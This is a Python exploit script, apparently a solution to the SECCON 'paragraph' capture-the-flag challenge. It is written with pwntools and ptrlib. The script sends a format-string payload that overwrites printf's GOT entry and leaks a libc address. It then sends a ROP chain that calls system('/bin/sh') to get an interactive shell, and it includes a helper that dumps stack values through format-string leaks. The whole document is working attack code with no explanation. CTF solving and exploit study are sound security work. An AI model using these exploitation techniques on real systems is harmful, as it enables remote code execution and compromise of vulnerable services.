#!/usr/bin/env python
import sys
import ptrlib as ptr
import pwn

# exe = ptr.ELF("./chall")
exe = ptr.ELF("./chall_patched")
pwn.context.binary = pwn.ELF(exe.filepath)
libc = ptr.ELF("./libc.so.6")

remote = len(sys.argv) > 1 and sys.argv[1] == "remote"


def connect():
    if remote:
        return pwn.remote("paragraph.seccon.games", 5000)
        # return pwn.remote("localhost", 5000)
    else:
        return pwn.process(exe.filepath)


def unwrap(x):
    if x is None:
        ptr.logger.error("Failed to unwrap")
        exit(1)
    else:
        return x


def main():
    io = connect()

    printf_got = unwrap(exe.got("printf"))
    scanf_offset = unwrap(libc.symbol("scanf"))

    payload = b""
    payload += b"%p"
    payload += f"%{str((scanf_offset & 0xffff) - 14)}c".encode()
    payload += b"%8$hn"
    payload += b"\0" * (16 - len(payload))
    payload += printf_got.to_bytes(
        7, "little"
    )  # 7-bytes padding to make libc-address at RSI

    ptr.logger.info(f"payload = {payload}")

    assert len(payload) <= 23
    if len(payload) == 23:
        io.send(payload)
    else:
        io.sendline(payload)

    io.recvuntil(b"0x")
    libc.base = int(io.recv(12), 16) - 0x1B28C0

    payload = b""
    payload += b' answered, a bit confused.\n"Welcome to SECCON," the cat greeted '
    payload += b"A" * 40
    payload += ptr.p64(next(exe.gadget("ret;")))
    payload += ptr.p64(next(exe.gadget("pop rdi; ret;")))
    payload += ptr.p64(next(libc.find("/bin/sh")))
    payload += ptr.p64(unwrap(libc.symbol("system")))

    io.sendline(payload)
    io.sendline(b"a")
    io.sendline(b"echo pwned!")
    io.recvuntil(b"pwned!\n")

    io.interactive()

    exit()


def dump():
    dump = ""
    for i in range(193):
        print(i)
        io = connect()
        payload = f"#%{i}$lx#".encode()
        assert len(payload) < 24
        io.sendline(payload)
        io.recvuntil(b"#")
        leak = io.recvuntil(b"#", drop=True).decode()
        dump += f"{hex(0x7fffffffea20 + 8 * (i - 6))} {i}: 0x{leak}\n"
        io.close()

    with open("./dump.txt", "w") as file:
        file.write(dump)


if __name__ == "__main__":
    while True:
        try:
            main()
        except Exception as e:
            print(e)
            continue
        # finally:
        # break
    # dump()
    # main()
